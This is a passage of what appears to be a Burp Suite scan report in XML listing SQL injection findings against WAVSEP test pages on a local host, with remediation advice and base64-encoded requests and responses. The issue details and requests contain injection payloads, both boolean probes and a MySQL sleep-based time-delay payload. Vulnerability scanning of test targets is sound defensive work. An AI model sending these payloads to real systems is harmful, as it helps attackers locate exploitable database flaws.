    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>96320888 or 5401=05401</b> and <b>28126635 or 2860=2861</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcD9taW5CYWxhbmFjZT0xMDAwMDk2MzIwODg4JTIwb3IlMjA1NDAxJTNkMDU0MDEgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcD9taW5CYWxhbmFjZT0xMDAwMDI4MTI2NjM1JTIwb3IlMjAyODYwJTNkMjg2MSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU3OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNTkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcD9taW5CYWxhbmFjZT0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjQ0IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>481506462057307136</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTE5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWNXaXRob3V0UXVvdGVzLUNvbW1hbmRJbmplY3Rpb24tV2l0aDIwMEVycm9ycy5qc3A/bXNnaWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE5IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4584266632123842560</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>85452567 or 2226=02226</b> and <b>80272315 or 4783=4791</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL0Nhc2UwMS1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1CbGluZC0yMDBWYWxpZFJlc3BvbnNlV2l0aERlZmF1bHRPbkV4Y2VwdGlvbi5qc3A/dHJhbnNhY3Rpb25JZD0xMzM4NTQ1MjU2NyUyMG9yJTIwMjIyNiUzZDAyMjI2IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwSWRlbnRpY2FsL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU5OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAxMjc1DQoNCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBhIG51bWVyaWMgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGRlZmF1bHQgdmFsaWQgcmVzcG9uc2Ugb24gZXhjZXB0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzIKPC9URD4KPFREPgoxMDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTMzCjwvVEQ+CjxURD4KMTIwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzNQo8L1REPgo8VEQ+CjMwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyMjMKPC9URD4KPFREPgo0MDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNDIzCjwvVEQ+CjxURD4KNTAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjQ1Ngo8L1REPgo8VEQ+CjYwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo3ODkKPC9URD4KPFREPgo3MDEyCjwvVEQ+CjxURD4KRXhwZW5zaXZlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8VFI+CjxURD4KODk1CjwvVEQ+CjxURD4KODAwMAo8L1REPgo8VEQ+CmVtcHR5CjwvVEQ+CjxURD4KMjAxMC0wMi0wMgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
